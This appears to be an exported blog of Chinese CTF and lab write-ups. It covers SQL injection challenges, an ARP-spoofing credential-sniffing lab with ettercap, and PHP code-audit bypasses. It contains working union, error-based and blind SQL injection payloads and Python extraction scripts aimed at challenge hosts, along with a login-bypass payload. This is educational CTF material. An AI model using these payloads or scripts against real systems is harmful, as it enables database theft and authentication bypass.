    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
<p>3被回显</p>
<p>1.查看数据库名</p>
<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>

<p>数据库的名字<code>g8</code></p>
<p>2.查看表名</p>
<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
<p>发现有一个表 <code>flag</code></p>
<p>3.测试表的字段</p>
<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
<p>仍然显示<code>flag</code></p>
<p>4.读取flag   </p>
<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>

<p>得到flag!</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>arp attack</title>
    <url>/2020/11/27/attack/</url>
    <content><![CDATA[<h1 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h1><p>ARP（Address Resolution Protocol，地址解析协议是一个位于<a href="https://baike.baidu.com/item/TCP%2FIP协议">TCP/IP协议</a>栈中的网络层，负责将某个<a href="https://baike.baidu.com/item/IP地址">IP地址</a>解析成对应的<a href="https://baike.baidu.com/item/MAC地址">MAC地址</a>。</p>
<span id="more"></span>

<p>ARP 病毒攻击是<a href="https://baike.baidu.com/item/局域网/98626">局域网</a>最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常<a href="https://baike.baidu.com/item/上网/217407">上网</a>和<a href="https://baike.baidu.com/item/通信/300982">通信</a>安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。</p>
<h2 id="实验机器"><a href="#实验机器" class="headerlink" title="实验机器"></a>实验机器</h2><p>2003虚拟机，作为ftp服务器</p>
<p>xp虚拟机作为用户访问ftp服务</p>
<p>kali作为攻击方，获取xp登录时的账号密码</p>
<p>xp:10.1.1.3/24</p>
<p>2003:10.1.1.1/24</p>
<p>kali:10.1.1.2/24</p>
<h2 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h2><p><img src="https://i.loli.net/2020/11/27/BCE6m9cM5pzrFhL.png" alt="1.png"></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-检查三台主机的通信情况"><a href="#一-检查三台主机的通信情况" class="headerlink" title="一.检查三台主机的通信情况"></a>一.检查三台主机的通信情况</h3><p>三台主机通信正常</p>
<h3 id="二-2003开启ftp服务器"><a href="#二-2003开启ftp服务器" class="headerlink" title="二.2003开启ftp服务器"></a>二.2003开启ftp服务器</h3><p>开启ftp服务，并设置禁止匿名访问</p>
<p>并创建xp访问时需要的使用的账号</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>aaa

<span class="hljs-symbol">password:</span><span class="hljs-number">123.</span><span class="hljs-keyword">com</span></code></pre>

<p>验证是可以正常访问的</p>
<h3 id="三-kali打开攻击软件"><a href="#三-kali打开攻击软件" class="headerlink" title="三.kali打开攻击软件"></a>三.kali打开攻击软件</h3><p>打开ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;选择第一项</p>
<p>扫描到两台目标主机，开始arp投毒</p>
<p><img src="https://i.loli.net/2020/11/27/Xos23uSIPQxkiqT.png" alt="arp-2.png"></p>
<p>此时arp攻击已经开始了</p>
<p>可以看到两个不同的IP对应的确实同一mac地址，当自己的电脑出现这种情况时就可以判断是arp攻击了</p>
<h3 id="四-xp访问ftp服务器，kali抓取到账号密码"><a href="#四-xp访问ftp服务器，kali抓取到账号密码" class="headerlink" title="四.xp访问ftp服务器，kali抓取到账号密码"></a>四.xp访问ftp服务器，kali抓取到账号密码</h3><p>开始第四步</p>
<p>xp访问ftp并输入账号密码</p>
<p>kali那边已经抓取到</p>
<p><img src="https://i.loli.net/2020/11/27/CuI1ovGWZz9tEUp.png" alt="arp-3.png"></p>
<h2 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h2><p>arp攻击的另外一种形式是利用ARP欺骗，造成局域网内主机通信的失败，就是无法连接网络。实现方法比较简单就不再赘述。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>arp</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-LFI</title>
    <url>/2020/10/08/buuoj-LFI/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-sql注入</title>
    <url>/2020/10/05/buuoj/</url>
    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><span id="more"></span>

<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" alt></p>
<p>构造盲注语句</p>
<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" alt></p>
<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" alt></p>
<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
<pre><code class="hljs python">// 二分注入
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>

data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;

flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
    left = <span class="hljs-number">33</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(right&gt;left):

        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        response = requests.post(url,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)

print(flag)</code></pre>





<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" alt></p>
<p>可是使用报错注入</p>
<blockquote>
<p>报错注入原理：</p>
<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
</blockquote>
<p>相关链接</p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
<blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
</blockquote>
<p>查询语句如下</p>
<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>

<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
<p>显示后面的flag</p>
<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>



<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
<pre><code class="hljs php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];
<span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;
<span class="hljs-comment">// echo $sql;</span>
<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);

<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;
		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;
			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
				<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
		&#125;
	&#125;
&#125;</code></pre>

<p>随便输入用户名和密码，查看源码，出现提示</p>
<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" alt></p>
<p>试了试应该是base32，解码后是base64</p>
<pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre>

<p>继续解码</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>

<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
<p>值得注意的是，这题可以知道username是admin，</p>
<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
<p>接下来介绍一种新的union注入</p>
<p>先建立一张表</p>
<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" alt></p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre>

<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" alt></p>
<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
<p>这里就是 id=1,username=admin,password=2322</p>
<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">name</span>=<span class="hljs-number">000</span>&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;b<span class="hljs-number">59</span>c<span class="hljs-number">67</span>bf<span class="hljs-number">196</span>a<span class="hljs-number">4758191</span>e<span class="hljs-number">42</span>f<span class="hljs-number">76670</span>ceba&#x27;#&amp;pw=<span class="hljs-number">1111</span></code></pre>

<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" alt></p>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" alt="image-20201223090038080"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
<span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre>

<p>所以可以将注入的payload加到中间，例如</p>
<pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre>

<p>注入脚本如下，使用的是二分法</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>
flag = <span class="hljs-string">&#x27;&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i, j</span>):</span>
    time.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span>
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span>
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span>
    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)
    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;
    r = requests.get(url, params=data)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:
        res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        res = <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
    <span class="hljs-keyword">global</span> flag
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
        print(i, <span class="hljs-string">&#x27;:&#x27;</span>)
        low = <span class="hljs-number">31</span>
        high = <span class="hljs-number">127</span>
        <span class="hljs-keyword">while</span> low &lt;= high:
            mid = (low + high) // <span class="hljs-number">2</span>
            res = payload(i, mid)
            <span class="hljs-keyword">if</span> res:
                low = mid + <span class="hljs-number">1</span>
            <span class="hljs-keyword">else</span>:
                high = mid - <span class="hljs-number">1</span>
        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># print (f)</span>
        flag += <span class="hljs-built_in">chr</span>(f)
        print(flag)
exp()
print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>

<p>又学到了新的注入姿势，真不错</p>
<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
]]></content>
      <categories>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>二分注入</tag>
        <tag>报错注入</tag>
        <tag>union新姿势</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku代码审计</title>
    <url>/2020/09/14/decode/</url>
    <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><span id="more"></span>

<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;  <span class="hljs-comment">//新建变量</span>
extract(<span class="hljs-variable">$_GET</span>);  <span class="hljs-comment">// 变量覆盖</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))   <span class="hljs-comment">//判断是否存在</span>
&#123;
<span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$flag</span>));<span class="hljs-comment">//把文件读入字符串</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)  <span class="hljs-comment">//判断两变量是否相等</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>extract()函数</p>
<p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" alt="extrct.png"></p>
<p><strong>isset()函数</strong><br>isset() 函数用于检测变量是否已设置并且非 NULL。</p>
<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
<p>Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。</p>
<p>file_get_contents() </p>
<p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" alt="file.png"></p>
<p>变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值</p>
<p>这里值得注意的是 <code>$shiyan</code>==<code>$content</code>,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同</p>
<p>可以用空值的方法使二者想等即</p>
<p><code>?shiyan=&amp;flag=</code></p>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php">http://123.206.87.240:9009/6.php</a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;
<span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span>
<span class="hljs-comment">//比较两个字符串（区分大小写）</span>
<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>题目给的注释很清楚的给出了获得flag的条件。。。</p>
<p>先了解一下</p>
<p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" alt="strcmp.png"></p>
<p>strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  即可获得flag</p>
<p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目说的很清楚了，二次编码绕过</p>
